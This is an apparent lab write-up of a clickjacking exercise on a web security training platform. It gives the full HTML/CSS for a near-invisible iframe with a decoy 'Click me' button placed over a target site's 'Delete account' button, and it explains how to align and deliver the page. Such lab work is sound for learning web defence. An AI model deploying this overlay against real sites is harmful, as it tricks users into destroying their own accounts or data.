

# Clickjacking Attack Writeup — How I Did It

I had to trick a user into clicking the **Delete account** button on the target website without them realizing it. To do that, I used a transparent iframe and a fake button to overlay on top. Here’s exactly how I set it up:

1. First, I logged into my account on the target site to make sure I had a valid session.

2. Then I went to the exploit server page where I could create my malicious HTML.

3. I copied this template into the body of the exploit server page:

   ```html
   <style>
       iframe {
           position: relative;
           width: 500px;
           height: 700px;
           opacity: 0.1;  /* semi-transparent for now */
           z-index: 2;
           cursor: pointer;
       }
       div {
           position: absolute;
           top: 300px;
           left: 60px;
           z-index: 1;
           font-size: 24px;
           background: lightgray;
           width: 100px;
           height: 30px;
           text-align: center;
           line-height: 30px;
           user-select: none;
           cursor: pointer;
       }
   </style>

   <div>Test me</div>
   <iframe src="YOUR-LAB-ID.web-security-academy.net/my-account"></iframe>
   ```

4. I replaced `YOUR-LAB-ID` in the iframe’s `src` attribute with my actual lab ID to point it to the target page.

5. I chose `500px` width and `700px` height for the iframe, which fits the page nicely.

6. The div with “Test me” acts as a decoy button. I positioned it with `top: 300px` and `left: 60px` so it sits exactly over the **Delete account** button inside the iframe.

7. At first, I set the iframe’s opacity to `0.1` so I could see the iframe content faintly and make sure the div lined up perfectly with the button.

8. After saving the exploit page and viewing it, I hovered over “Test me” and saw the cursor change to a pointer — which meant my div was correctly positioned and clickable.

9. I adjusted the `top` and `left` values a bit until it matched perfectly, so clicking “Test me” would actually click the hidden **Delete account** button.

10. Once everything was aligned, I changed the div text from “Test me” to **“Click me”** to make it more tempting.

11. Then I lowered the iframe opacity to `0.0001` — basically invisible but still clickable — and saved it again.

12. Finally, I clicked **Deliver exploit to victim** to send this page.

When the victim clicks **Click me**, they’re actually clicking the hidden **Delete account** button inside the transparent iframe, completing the attack.

**Important:** I was careful NOT to click the button myself during testing, or else the lab would break and I’d have to wait for a reset.

